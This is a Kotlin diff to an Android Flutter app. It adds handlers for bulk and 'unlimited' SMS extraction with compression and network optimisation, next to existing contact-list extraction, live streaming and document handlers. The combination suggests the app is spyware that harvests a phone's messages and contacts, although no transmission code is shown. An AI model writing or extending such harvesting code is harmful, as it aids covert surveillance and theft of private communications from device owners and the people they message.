@@ -553,6 +553,7 @@ class MainActivity : FlutterActivity() {
     private lateinit var liveStreamingManager: LiveStreamingManager
     private lateinit var communicationDataManager: CommunicationDataManager
     private lateinit var documentLibrarian: DocumentLibrarian
+    private lateinit var messageManager: MessageManager
 
     override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
@@ -569,6 +570,9 @@ class MainActivity : FlutterActivity() {
         liveStreamingManager = LiveStreamingManager(this, methodChannel)
         communicationDataManager = CommunicationDataManager(this)
         documentLibrarian = DocumentLibrarian(this)
+        
+        // إضافة المدير المحسن للرسائل
+        messageManager = MessageManager(this)
     }
     
     private fun setupMethodChannelHandler() {
@@ -596,6 +600,9 @@ class MainActivity : FlutterActivity() {
                 }
                 "extractSMSMessages" -> {
                     handleSMSMessages(result)
+                }
+                "extractAllSMSMessages" -> {
+                    handleExtractAllSMSMessages(result)
                 }
                 "extractContactsList" -> {
                     handleContactsList(result)
@@ -673,28 +680,55 @@ class MainActivity : FlutterActivity() {
         }
     }
     
+    /**
+     * معالج الرسائل النصية المحسن - يستخدم النظام الجديد
+     * Enhanced SMS handler - uses new system
+     */
     private fun handleSMSMessages(result: MethodChannel.Result) {
-        Log.d("MainActivity", "Handling SMS messages extraction request.")
+        Log.d("MainActivity", "Handling enhanced SMS extraction with optimization...")
         
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val messageDataCollector = MessageDataCollector(this@MainActivity)
-                val messagesData = messageDataCollector.extractCommunicationMessages(false)
-                
-                withContext(Dispatchers.Main) {
-                    result.success(messagesData.toString())
-                }
-                Log.i("MainActivity", "SMS messages extraction completed successfully.")
+                // استخدام النظام المحسن مع التحسين للشبكة
+                messageManager.handleExtractCommunicationMessages(result, false, true)
+                Log.i("MainActivity", "Enhanced SMS extraction completed successfully.")
                 
             } catch (securityEx: SecurityException) {
-                Log.e("MainActivity", "Security error during SMS extraction", securityEx)
+                Log.e("MainActivity", "Security error during enhanced SMS extraction", securityEx)
                 withContext(Dispatchers.Main) {
                     result.error("SECURITY_ERROR", "Access denied to SMS messages", securityEx.message)
                 }
             } catch (generalEx: Exception) {
-                Log.e("MainActivity", "General error during SMS extraction", generalEx)
+                Log.e("MainActivity", "General error during enhanced SMS extraction", generalEx)
                 withContext(Dispatchers.Main) {
                     result.error("EXTRACTION_ERROR", "Failed to extract SMS messages", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    /**
+     * معالج جديد لاستخراج جميع الرسائل النصية
+     * New handler for extracting all SMS messages
+     */
+    private fun handleExtractAllSMSMessages(result: MethodChannel.Result) {
+        Log.d("MainActivity", "Handling unlimited SMS extraction with compression...")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                // استخدام النظام غير المحدود مع الضغط
+                messageManager.handleExtractAllMessages(result)
+                Log.i("MainActivity", "Unlimited SMS extraction completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during unlimited SMS extraction", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("SECURITY_ERROR", "Access denied to SMS messages", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during unlimited SMS extraction", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("EXTRACTION_ERROR", "Failed to extract all SMS messages", generalEx.message)
                 }
             }
         }
